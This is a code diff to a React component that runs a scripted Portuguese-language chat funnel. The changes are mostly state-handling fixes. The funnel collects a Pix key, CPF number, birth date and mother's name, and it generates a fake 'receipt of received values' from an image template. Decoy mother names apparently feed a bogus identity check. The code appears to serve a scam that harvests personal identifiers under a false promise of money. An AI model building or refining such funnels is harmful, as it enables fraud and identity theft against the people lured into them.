@@ -281,7 +281,7 @@ const funnelDefinition: {
       "delay_ms": 1000,
       "data": {
         "message": "Gerando seu comprovante de recebimento dos valores...",
-        "templateUrl": "https://i.imgur.com/J8z6Y7z.png",
+        "templateUrl": "https://i.imgur.com/pQXJNTI.png",
         "imageAiHint": "receipt screenshot",
         "imageAltText": "Comprovante Gerado",
         "dataMapping": [
@@ -415,7 +415,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       if (savedFlowVars) {
         const parsedSaved = JSON.parse(savedFlowVars);
         Object.keys(parsedSaved).forEach(key => {
-            if (key in defaultGlobalVars || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName'].includes(key)) {
+            if (key in defaultGlobalVars || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName', 'dataAtual', 'randomMotherName1', 'randomMotherName2'].includes(key)) {
                  newFlowVariables[key] = parsedSaved[key];
             }
         });
@@ -593,6 +593,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               });
               setShowVideoSoundOverlay(true);
               setIsVideoMuted(true);
+              // Removed premature return and setIsBotTyping(false)
               break;
             }
             case 'multipleChoice': {
@@ -666,6 +667,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setCurrentTextInputConfig(data);
               setIsTextInputActive(true);
               setTextInputValue("");
+              // Removed premature return and setIsBotTyping(false)
               break;
             }
             case 'displayDynamicImage': {
@@ -744,6 +746,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       console.warn("SimulatedChatFlow: Option clicked with null or undefined text property.");
       return;
     }
+    setCurrentVideoData(null);
+    setIsLoadingStep(false);
+    setLoadingMessage(null);
+    setIsTextInputActive(false);
+    setCurrentTextInputConfig(null);
+
 
     const userMessageId = `user-${Date.now()}`;
     setMessages(prevMsgs => [...prevMsgs, { id: userMessageId, sender: 'user', text: option.text }]);
@@ -751,15 +759,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     // Remove options from the bot message that was just replied to
     setMessages(prevMsgs => {
         const msgsCopy = [...prevMsgs];
-        // Find the index of the last bot message that had options
         let repliedToBotMessageIndex = -1;
-        for (let i = msgsCopy.length - 2; i >= 0; i--) { // Start from one before the user's reply
+        for (let i = msgsCopy.length - 2; i >= 0; i--) { 
             if (msgsCopy[i].sender === 'bot' && msgsCopy[i].options && msgsCopy[i].options.length > 0) {
                 repliedToBotMessageIndex = i;
                 break;
             }
         }
-
         if (repliedToBotMessageIndex !== -1) {
             msgsCopy[repliedToBotMessageIndex] = { ...msgsCopy[repliedToBotMessageIndex], options: undefined };
         }
@@ -806,12 +812,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       videoPlayerRef.current.play().catch(e => console.warn("Error trying to play video after unmuting:", e));
     }
     setShowVideoSoundOverlay(false);
-    // No setIsBotTyping(true) here, video interaction itself doesn't trigger bot "typing" for next step
+    setIsBotTyping(true); 
   };
 
   const handleVideoEnded = () => {
     const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
-    setIsBotTyping(true); // Bot will "type" for the next step
+    setIsBotTyping(true);
 
     if (stepConfig?.type === 'displayVideo' && stepConfig.nextStep) {
       handleUserActionAndNavigate(stepConfig.nextStep);
@@ -827,14 +833,20 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         setTimeout(() => setMessages(prev => prev.filter(m => m.id !== tempMsgId)), 2000);
         return;
     }
+    
+    setCurrentVideoData(null);
+    setIsLoadingStep(false);
+    setLoadingMessage(null);
+    setIsTextInputActive(false);
+    setCurrentTextInputConfig(null);
 
     setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
-    setIsBotTyping(true); // Bot will "type" for the next step
+    setIsBotTyping(true); 
 
     if (currentTextInputConfig.variableToSet === 'chavePix') {
         setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
     }
-    setTextInputValue(""); // Clear input after submission
+    setTextInputValue(""); 
 
     const nextStepKey = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep)?.nextStep;
     handleUserActionAndNavigate(nextStepKey);
@@ -1137,3 +1149,5 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 };
 
 export default SimulatedChatFlow;
+
+    
